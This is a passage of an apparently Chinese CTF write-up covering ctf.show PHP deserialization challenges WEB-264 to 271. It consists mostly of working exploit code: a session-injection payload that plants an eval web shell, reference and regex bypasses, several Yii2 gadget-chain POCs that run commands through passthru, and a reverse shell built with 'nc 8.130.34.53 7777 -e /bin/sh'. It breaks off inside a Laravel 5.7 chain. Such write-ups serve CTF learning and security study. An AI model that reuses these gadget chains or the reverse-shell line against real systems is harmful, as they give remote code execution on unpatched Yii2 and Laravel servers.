&#39;php&#39;);</code>参考：<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p><p>session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。  </p><ul><li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li><li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li><li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li></ul><p>然后简单的逻辑就是我们可以通过控制session去序列化</p><p>在inc.php有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他的析构函数就是我们的插入点</p><p>因为这个题目是默认的引擎 所以session是用<code>|</code>来分割键值 值为serialize()处理的结果</p><p>poc如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                   <span class="meta">?&gt;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">echo base64_encode(&#x27;</span>|<span class="string">&#x27;.serialize($a))</span></span><br><span class="line"><span class="string">#fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问index.php cookie[limit]打入 再访问check.php </p><p>然后访问我们的木马文件 log-1.php</p><p>rce即可</p><h1 id="WEB-265-取地址符"><a href="#WEB-265-取地址符" class="headerlink" title="WEB-265(取地址符)"></a>WEB-265(取地址符)</h1><p>这道题目一开始看 发现这个随机数函数绕过不去 看了wp 师傅们太强了 </p><p>用了<code>&amp;</code>取地址 <code>$a=&amp;$b</code>则当b值变 a也跟着变</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password =&amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">#O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="WEB-266"><a href="#WEB-266" class="headerlink" title="WEB-266"></a>WEB-266</h1><p>这道题目大写绕个正则即可 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>df5fa90-<span class="number">8128</span>-<span class="number">463</span>c-b40b-<span class="number">12</span>ed31c48ad8.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 18</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WEB-267-Yii2反序列化链"><a href="#WEB-267-Yii2反序列化链" class="headerlink" title="WEB-267(Yii2反序列化链)"></a>WEB-267(Yii2反序列化链)</h1><p>yii2是php的一个框架 直接在网上找现成的链子poc即可</p><p>首先通过弱口令 admin&#x2F;admin登录 然后查看about </p><p>提示访问<code>?r=site%2Fabout&amp;view-source</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688552009392-f89d43dd-2251-4780-864b-91c362be0e92.png" alt="img"></p><p>然后这里查看源码可以发现yii2这个信息 因为是反序列化模块嘛直接去找链子即可</p><p>这道题找到的poc只能用passthru函数 其他函数都用不了 挺奇怪的</p><p>poc如下： 参考：<a href="https://www.anquanke.com/post/id/254429">https://www.anquanke.com/post/id/254429</a> 这里的链子哪个不行换就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span> &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">BatchQueryResult</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoyOiJpZCI7czo5OiJjYXQgL2ZsYWciO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjg6InBhc3N0aHJ1Ijt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><h1 id="WEB-268（Yii2反序列化链）"><a href="#WEB-268（Yii2反序列化链）" class="headerlink" title="WEB-268（Yii2反序列化链）"></a>WEB-268（Yii2反序列化链）</h1><p>前面的链子不行了 换一个就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span> &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess=<span class="string">&quot;passthru&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id=<span class="string">&quot;cat /flags&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="WEB-269-Yii2反序列化链"><a href="#WEB-269-Yii2反序列化链" class="headerlink" title="WEB-269(Yii2反序列化链)"></a>WEB-269(Yii2反序列化链)</h1><p>继续换：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cat /flagsa&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">phpDocumentor</span>\<span class="title class_">Reflection</span>\<span class="title class_">DocBlock</span>\<span class="title class_">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">phpDocumentor</span>\<span class="title class_">Reflection</span>\<span class="title class_">DocBlock</span>\<span class="title class_">Tags</span>\<span class="title class_">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path = <span class="keyword">new</span> <span class="title class_">See</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Swift_KeyCache_DiskKeyCache</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-270-Yii2反序列化链"><a href="#WEB-270-Yii2反序列化链" class="headerlink" title="WEB-270(Yii2反序列化链)"></a>WEB-270(Yii2反序列化链)</h1><p>这次用反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">nc</span> 8.130.34.53 7777 -<span class="title class_">e</span> /<span class="title class_">bin</span>/<span class="title class_">sh</span>&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="WEB-271-Laravel5-7反序列化"><a href="#WEB-271-Laravel5-7反序列化" class="headerlink" title="WEB-271(Laravel5.7反序列化)"></a>WEB-271(Laravel5.7反序列化)</h1><p>直接网上嫖利用链就行了</p><p>参考：<a href="https://xz.aliyun.com/t/10578#toc-3">https://xz.aliyun.com/t/10578#toc-3</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title 